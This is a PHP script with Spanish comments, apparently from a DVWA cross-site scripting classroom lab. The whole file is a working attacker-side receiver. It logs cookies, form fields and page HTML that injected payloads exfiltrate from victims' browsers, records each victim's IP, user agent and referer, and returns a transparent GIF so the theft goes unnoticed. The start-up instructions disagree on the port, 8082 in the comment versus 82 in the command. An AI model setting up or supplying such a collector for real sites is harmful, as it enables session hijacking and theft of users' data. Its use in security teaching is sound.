<?php
/**
 * Servidor de atacante — receptor simple para el laboratorio XSS con DVWA.
 *
 * Acá llegan los datos que el navegador de la "víctima" envía cuando se
 * ejecuta el payload de exfiltración inyectado en DVWA (Ejercicio A.1).
 * Todo queda guardado en registro.log, una línea JSON por petición.
 *
 * Uso EXCLUSIVO en el aula / entorno local de pruebas.
 *
 * Arrancar en el puerto 8082:
 *     php -S 0.0.0.0:82
 * Ver lo capturado:
 *     http://localhost:8082/ver.php
 */

// Permite que una página de otro origen (DVWA) lea la respuesta con fetch/XHR.
// Para el beacon (rastreo) de <img> no hace falta, pero sirve para variantes con fetch.
header('Access-Control-Allow-Origin: *');

// Respondemos un GIF transparente de 1x1 para que la etiqueta <img> de la
// víctima no muestre un ícono roto y la exfiltración pase desapercibida.
header('Content-Type: image/gif');

$fila = [
    'hora'       => date('c'),
    'ip_victima' => $_SERVER['REMOTE_ADDR'] ?? '-',
    'datos'      => $_GET, // lo que interesa: cookie=..., campos=..., html=..., etc.
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '-',
    'referer'    => $_SERVER['HTTP_REFERER'] ?? '-', // desde qué página de DVWA se disparó
];

file_put_contents(
    __DIR__ . '/registro.log',
    json_encode($fila, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) . PHP_EOL,
    FILE_APPEND | LOCK_EX
);

// 1x1 GIF transparente.
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
